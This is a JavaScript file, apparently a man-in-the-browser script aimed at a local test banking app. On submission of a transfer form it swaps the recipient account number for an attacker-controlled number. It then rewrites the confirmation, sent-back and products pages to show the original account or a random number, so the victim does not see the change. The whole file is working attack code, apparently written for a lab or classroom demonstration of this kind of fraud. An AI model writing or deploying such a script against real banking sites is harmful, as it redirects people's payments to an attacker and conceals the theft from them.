let eavesdropperAccountNumber = '';

for (let i = 0; i < 26; i++) {
    eavesdropperAccountNumber += '9';
}

localStorage.setItem('fake_account_number', eavesdropperAccountNumber);


function regex() {
    return new RegExp(eavesdropperAccountNumber, 'g');
}

function makeid(length) {
    var result = '';
    var characters = '0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (window.location.href == 'http://127.0.0.1:8000/create_transfer/') {
    document.addEventListener('submit', () => {
        console.log("caught submit");
        localStorage.setItem('real_account_number', document.getElementById('id_account_number').value);
        document.getElementById('id_account_number').value = localStorage.getItem('fake_account_number');
    });
}

if (window.location.href == 'http://127.0.0.1:8000/create_transfer/') {
    console.log("caught confirm");
    // let data = document.getElementsByClassName('id_account_number').innerHTML;
    // let replacedData = data.replace(regex(), localStorage.getItem('real_account_number'));
    document.getElementById('id_account_number').innerHTML = localStorage.getItem('real_account_number');
}

if (window.location.href == 'http://127.0.0.1:8000/send_back_transfer/') {
    console.log("caught sent back");
    // let data = document.getElementById('id_account_number').innerHTML;
    // let replacedData = data.replace(regex(), localStorage.getItem('real_account_number'));
    document.getElementById('id_account_number').innerHTML = localStorage.getItem('real_account_number');
}


// if (window.location.href == 'http://localhost:8000/transfer_sent/') {
//     document.getElementById('account').innerHTML = localStorage.getItem('real_account_number');
// }

if (window.location.href == 'http://127.0.0.1:8000/products/') {
    var all = document.querySelectorAll(".account_number_class");
    for (var i = 0; i < all.length; i++) {
        if (all[i].innerHTML == localStorage.getItem('fake_account_number')) {  //if this is hackers account number replace with random
            all[i].innerHTML = makeid(26);
        }
    }
}
